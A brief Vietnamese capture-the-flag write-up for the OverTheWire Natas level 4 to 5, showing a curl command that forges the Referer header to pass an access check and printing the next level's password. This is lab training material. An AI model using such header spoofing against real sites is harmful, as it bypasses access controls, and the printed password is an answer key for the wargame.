# Natas 4 → 5

## Mục tiêu

Vượt kiểm tra Referer.

## Tôi thấy

Server trả Access granted khi Referer trỏ tới natas5.

## Cách làm

```bash
curl -u natas4:<password> -H "Referer: http://natas5.natas.labs.overthewire.org/" http://natas4.natas.labs.overthewire.org/
```

## Vì sao cách này hiệu quả

Referer do client gửi nên giả mạo được.

## Kết quả

Password của `natas5`:

```text
e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M
```
